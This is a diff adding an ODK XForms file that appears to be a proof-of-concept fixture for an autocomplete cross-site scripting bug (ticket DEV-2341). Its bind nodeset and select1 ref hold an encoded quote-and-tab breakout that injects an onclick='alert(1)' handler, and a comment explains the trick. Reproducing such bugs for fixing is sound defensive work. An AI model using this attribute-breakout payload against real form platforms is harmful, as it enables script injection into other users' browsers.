@@ -1,0 +1,28 @@
+<?xml version="1.0"?>
+<h:html xmlns="http://www.w3.org/2002/xforms"
+    xmlns:ev="http://www.w3.org/2001/xml-events"
+    xmlns:h="http://www.w3.org/1999/xhtml"
+    xmlns:jr="http://openrosa.org/javarosa"
+    xmlns:odk="http://www.opendatakit.org/xforms"
+    xmlns:orx="http://openrosa.org/xforms"
+    xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+    <h:head>
+        <h:title>Autocomplete XSS PoC (DEV-2341)</h:title>
+        <model odk:xforms-version="1.0.0">
+            <instance>
+                <data id="autocomplete_xss">
+                    <city/>
+                </data>
+            </instance>
+            <bind nodeset="&#34;&#9;onclick=&#34;alert(1)" type="select1"/>
+        </model>
+    </h:head>
+    <h:body>
+        <!-- The ref/nodeset contains a double-quote + tab + onclick= to break out of the list attribute -->
+        <select1 ref="&#34;&#9;onclick=&#34;alert(1)" appearance="autocomplete">
+            <label>Select a City</label>
+            <item><label>Nairobi</label><value>nairobi</value></item>
+            <item><label>Lagos</label><value>lagos</value></item>
+        </select1>
+    </h:body>
+</h:html>
